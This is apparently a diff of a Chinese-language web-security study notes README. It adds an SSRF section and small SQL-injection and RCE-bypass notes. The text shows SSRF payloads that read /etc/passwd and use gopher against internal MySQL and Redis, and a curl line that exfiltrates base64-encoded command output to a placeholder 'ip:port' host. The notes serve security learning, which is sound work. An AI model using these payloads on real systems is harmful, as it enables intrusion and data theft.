@@ -8,6 +8,7 @@
 * 2021.02.15 文件上传部分完结
 * 2021.03.05 文件包含部分完结
 * 2021.03.05 命令执行部分完结
+* 2021.03.07 SSRF部分完结，后续会制作docker来提供SSRF2mysql/redis的环境（随缘更新）
 
 Progress
 - [x]  SQL Injection
@@ -32,7 +33,7 @@ Progress
 	- [x]  .htaccess
 - [x]  File Inclusion
 - [x]  RCE
-- [ ]  SSRF
+- [x]  SSRF
 - [ ]  CSRF
 - [ ]  XSS
 - [ ]  XXE?
@@ -80,7 +81,7 @@ select * from user where username='' or 1#' and password='$password'
 
 如果回显的内容为SQL语句查询出的内容，则可以通过联合查询来快速地得到信息，但是需要注意，最好使得原SQL语句无法查询出数据，否则可能会无法回显出联合查询得出的结果
 
-报错注入在于mysqli_error()这个函数的使用
+报错注入在于mysqli_error()这个函数的使用，漏洞利用函数一般为updatexml，extractvalue，floor这三个
 
 堆叠注入的特殊之处在于：堆叠注入使用的是mysqli_multi_query()，而一般使用mysqli_query()
 
@@ -225,7 +226,7 @@ RCE往往需要进行一系列Bypass
 
 使用Base64来对命令进行编码
 ```
-\`echo aWQ=|base64 -d\`
+`echo aWQ=|base64 -d`
 ```
 
 使用 cat tac head tail more less base64 strings curl grep 来读取文件
@@ -249,3 +250,24 @@ cat /fl?*
 ```
 d=(`id|base64`);curl http://ip:port/test.php?data=$d
 ```
+
+限定字符的命令执行
+https://www.anquanke.com/post/id/87203
+
+# SSRF #
+
+## Payload ##
+
+```
+?url=http://127.0.0.1/
+?url=file:///etc/passwd
+?url=gopher://127.0.0.1:3306/_quit
+```
+
+## 总结 ##
+
+SSRF可以对本地以及内网中的服务进行探测，在允许gopher协议的情况下，可以通过gopher协议发送tcp流量来访问一些服务
+
+比较典型的就是SSRF利用gopher去攻击mysql和redis
+
+https://github.com/tarunkant/Gopherus
